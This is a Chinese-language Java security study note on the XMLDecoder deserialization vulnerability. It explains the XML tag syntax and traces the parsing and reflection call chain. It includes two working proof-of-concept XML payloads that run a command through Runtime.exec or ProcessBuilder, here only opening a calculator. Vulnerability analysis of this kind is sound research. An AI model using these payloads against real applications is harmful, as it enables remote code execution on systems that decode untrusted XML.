# Java安全学习—XMLDecode反序列化

Author: H3rmesk1t

Data: 2022.03.03

# XMLDecode
## 简介
`XMLDecoder`是`java`自带的以`SAX`方式解析`xml`的类, 用于将`XMLEncoder`创建的`xml`文档内容反序列化为一个`Java`对象, 位于`java.beans`包下. `XMLDecoder`在`JDK 1.4`~`JDK 11`中都存在反序列化漏洞安全风险, 在反序列化经过特殊构造的数据时可执行任意命令.

## 序列化用法
先利用`XMLEncode`序列化生成一个`xml`文件:

```java
package org.h3rmesk1t.XMLDecode;

import java.beans.XMLEncoder;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/3 5:12 下午
 */
public class EncodeDemo {

    public static void main(String[] args) throws Exception {

        XMLEncoder xmlEncoder = new XMLEncoder(new BufferedOutputStream(new FileOutputStream("src/main/java/org/h3rmesk1t/XMLDecode/EncodeDemo.xml")));
        String name = "h3rmesk1t";
        xmlEncoder.writeObject(name);
        xmlEncoder.close();
    }
}
```

序列化输出结果:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_66" class="java.beans.XMLDecoder">
 <string>h3rmesk1t</string>
</java>
```

接着利用`XMLDecode`反序列化之前生成的`xml`文件内容:

```java
package org.h3rmesk1t.XMLDecode;

import java.beans.XMLDecoder;
import java.io.BufferedInputStream;
import java.io.FileInputStream;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/3 5:18 下午
 */
public class DecodeDemo {

    public static void main(String[] args) throws Exception {

        XMLDecoder xmlDecoder = new XMLDecoder(new BufferedInputStream(new FileInputStream("src/main/java/org/h3rmesk1t/XMLDecode/EncodeDemo.xml")));
        Object object = xmlDecoder.readObject();
        System.out.println(object);
        xmlDecoder.close();
    }
}
```

反序列化输出结果:

```text
h3rmesk1t
```

## XML 常见标签说明
 - `string`标签: `h3rmesk1t`字符串在`XML`中表示方式为`<string>h3rmesk1t</string>`
 - `object`标签: 通过`object`标签表示对象, 在该标签中`class`属性指定具体类(用于调用其内部方法), `method`属性指定具体方法名称. 例如`Runtime.getRuntime()`表示为如下形式:

```xml
<object class="java.lang.Runtime" method="getRuntime">
</object>
```

 - `void`标签: 通过`void`标签表示函数调用、赋值等操作, 在该标签中`method`属性指定具体的方法名称. 例如`JButton jButton = new JButton();jButton.setText("Hello, h3rmesk1t");`表示为如下形式:

```xml
<object class="java.swing.JButton">
    <void method="setText">
    <string>Hello, h3rmesk1t</string>
    </void>
</object>
```

 - `array`标签: 通过`array`标签表示数组, 在该标签中`class`属性指定具体类, 内部`void`标签的`index`属性表示根据指定数组索引赋值. 例如`String[] string = new String[5];s[4] = “Hello, h3rmesk1t”;`表示为如下形式:

```xml
<array class="java.lang.String" length="5">
    <void index="4">
    <string>Hello, h3rmesk1t</string>
    </void>
</array>
```

 - 更多标签说明可以看[XML 语法规则](https://www.runoob.com/xml/xml-syntax.html)

# XMLDecode 反序列化漏洞
## 漏洞说明
根据`XMLDecoder`解析`XML`并且运行代码调用方法的机制, 构造恶意`XML`让其解析并且执行恶意代码, 从而来达到任意命令执行的目的.

## POC
 - `Runtime.getRuntime().exec()`执行命令.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_66" class="java.beans.XMLDecoder">
    <object class="java.lang.Runtime" method="getRuntime">
        <void method="exec">
            <array class="java.lang.String" length="3">
                <void index="0">
                    <string>open</string>
                </void>
                <void index="1">
                    <string>-a</string>
                </void>
                <void index="2">
                    <string>Calculator</string>
                </void>
            </array>
        </void>
    </object>
</java>
```

 - `ProcessBuilder("cmd").start()`执行命令.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_66" class="java.beans.XMLDecoder">
    <object class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
            <void index="0">
                <string>open</string>
            </void>
            <void index="1">
                <string>-a</string>
            </void>
            <void index="2">
                <string>Calculator</string>
            </void>
        </array>
        <void method="start"></void>
    </object>
</java>
```

<div align=center><img src="./images/1.png"></div>

## 漏洞分析
### SAX
上面提到了, `XMLDecoder`是`java`自带的以`SAX`方式解析`xml`的类, 先来看看什么是`SAX`.

`SAX`即`Simple API For XML`, 在`Java`中有两种原生解析`XML`的方式, 分别是`SAX`和`DOM`, 其区别为:
 - `DOM`解析功能强大, 可增删改查, 操作时会将`XML`文档以文档对象的方式读取到内存中, 因此适用于小文档.
 - `SAX`解析是从头到尾逐行逐个元素读取内容, 修改较为不便, 但适用于只读的大文档.

`SAX`采用事件驱动的形式来解析`XML`文档, 简单来讲就是触发了事件就去做事件对应的回调方法. 在`SAX`中, 读取到文档开头、结尾, 元素的开头和结尾以及编码转换等操作时会触发一些回调方法, 可以在这些回调方法中进行相应事件处理:
 - startDocument
 - endDocument
 - startElement
 - endElement
 - characters

这里借用[Y4er 师傅的 Java XMLDecoder 反序列化分析](https://y4er.com/post/java-xmldecoder/#:~:text=%E8%87%AA%E5%B7%B1%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8ESAX%E7%9A%84%E8%A7%A3%E6%9E%90%E5%8F%AF%E4%BB%A5%E5%B8%AE%E6%88%91%E4%BB%AC%E6%9B%B4%E5%A5%BD%E7%9A%84%E7%90%86%E8%A7%A3XMLDecoder)中自己实现的基于`SAX`解析来理解`XMLDecode`.

```java
package org.h3rmesk1t.XMLDecode;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/3 6:29 下午
 */
import org.xml.sax.Attributes;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import java.io.File;

public class DemoHandler extends DefaultHandler {
    public static void main(String[] args) {
        SAXParserFactory saxParserFactory = SAXParserFactory.newInstance();
        try {
            SAXParser parser = saxParserFactory.newSAXParser();
            DemoHandler dh = new DemoHandler();
            String path = "src/main/java/org/h3rmesk1t/XMLDecode/POC1.xml";
            File file = new File(path);
            parser.parse(file, dh);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void characters(char[] ch, int start, int length) throws SAXException {
        System.out.println("characters()");
        super.characters(ch, start, length);
    }

    @Override
    public void startDocument() throws SAXException {
        System.out.println("startDocument()");
        super.startDocument();
    }

    @Override
    public void endDocument() throws SAXException {
        System.out.println("endDocument()");
        super.endDocument();
    }

    @Override
    public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
        System.out.println("startElement()");
        for (int i = 0; i < attributes.getLength(); i++) {
            // getQName()是获取属性名称
            System.out.print(attributes.getQName(i) + "=\"" + attributes.getValue(i) + "\"\n");
        }
        super.startElement(uri, localName, qName, attributes);
    }

    @Override
    public void endElement(String uri, String localName, String qName) throws SAXException {
        System.out.println("endElement()");
        System.out.println(uri + localName + qName);
        super.endElement(uri, localName, qName);
    }
}
```

输出调用的结果如下, 可以看到通过继承`SAX`的`DefaultHandler`类, 重写其事件方法, 就能拿到`XML`对应的节点、属性和值. `XMLDecoder`也是基于`SAX`实现的`XML`解析, 不过它拿到节点、属性、值之后通过`Expression`创建对象及调用方法.

```xml
startDocument()
startElement()
version="1.8.0_66"
class="java.beans.XMLDecoder"
characters()
startElement()
class="java.lang.Runtime"
method="getRuntime"
characters()
startElement()
method="exec"
characters()
startElement()
class="java.lang.String"
length="3"
characters()
startElement()
index="0"
characters()
startElement()
characters()
endElement()
string
characters()
endElement()
void
characters()
startElement()
index="1"
characters()
startElement()
characters()
endElement()
string
characters()
endElement()
void
characters()
startElement()
index="2"
characters()
startElement()
characters()
endElement()
string
characters()
endElement()
void
characters()
endElement()
array
characters()
endElement()
void
characters()
endElement()
object
characters()
endElement()
java
endDocument()
```

### 过程调用
将断点下在`XMLDecoder.readObject`处, 跟进`readObejct`方法, 继续跟进判断语句中的`parsingComplete`方法, `this.handler`为`DocumentHandler`.

<div align=center><img src="./images/2.png"></div>

<div align=center><img src="./images/3.png"></div>

<div align=center><img src="./images/4.png"></div>

跟进`com.sun.beans.decoder.DocumentHandler#parse`, 在`run`方法中会通过`SAXParserFactory`工厂创建实例, 进而调用`newSAXParser`来获取`SAX`解析器, 并调用`parse`方法来进行解析.

<div align=center><img src="./images/5.png"></div>

接着跟进`com.sun.org.apache.xerces.internal.parsers.XML11Configuration#parse`方法中, 调用`determineDocVersion`方法.

<div align=center><img src="./images/7.png"></div>

跟进`com.sun.org.apache.xerces.internal.impl.XMLVersionDetector#determineDocVersion`方法, 发现这里主要是获取`XML`实体扫描器, 然后扫描解析`<?xml version=...?>`来获取`XML`文档的版本信息.

<div align=center><img src="./images/8.png"></div>

获取到版本信息后, 回到`com.sun.org.apache.xerces.internal.parsers.XML11Configuration#parse`方法中, 调用`startDocumentParsing`来重置扫描器的版本配置, 并调用`startEntity`方法.

<div align=center><img src="./images/9.png"></div>

<div align=center><img src="./images/10.png"></div>

跟进`com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl#startEntity`方法, 可以看到在最后会调用到`DocumentHandler#startDocument`, 来清空当前对象和句柄并准备进行文件扫描.

<div align=center><img src="./images/11.png"></div>

<div align=center><img src="./images/12.png"></div>

接着回到`com.sun.org.apache.xerces.internal.parsers.XML11Configuration#parse`方法中, 调用`scanDocument`方法开始文件扫描.

<div align=center><img src="./images/13.png"></div>

跟进`com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl#scanDocument`方法, 设置实体句柄后, 执行`do-while`循环并利用`switch-case`语句进行判断, 其中包含对`START_DOCUMENT`、`START_ELEMENT`、`CHARACTERS`、`SPACE`、`ENTITY_REFERENCE`、`PROCESSING_INSTRUCTION`、`COMMENT`、`DTD`、`CDATA`、`NOTATION_DECLARATION`、`ENTITY_DECLARATION`、`NAMESPACE`、`ATTRIBUTE`、`END_ELEMENT`等扫描识别.

<div align=center><img src="./images/14.png"></div>

当判断到`END_ELEMENT`时, 一路跟进到`ElementHandler#endElement`, 跟进到`ObjectElementHandler#getValueObject`中, 先逐步把`open`、`-a`、`Calculator`取出来, 

<div align=center><img src="./images/15.png"></div>

<div align=center><img src="./images/16.png"></div>

<div align=center><img src="./images/17.png"></div>

<div align=center><img src="./images/18.png"></div>

继续跟进到`ObjectElementHandler#getValueObject`中, 可以看到变量`var3`和`var4`分别为获取到`Runtime`类名和`exec`方法名.

<div align=center><img src="./images/19.png"></div>

再调用`Expression#getValue`, 跟进到`Statement#invoke`, 再跟进到`Statement#invokeInternal`, 最后调用`MethodUtil#invoke`来实现反射执行任意类方法.

<div align=center><img src="./images/20.png"></div>

<div align=center><img src="./images/21.png"></div>

<div align=center><img src="./images/22.png"></div>

# 参考
 - [Java XMLDecoder反序列化分析](https://y4er.com/post/java-xmldecoder/)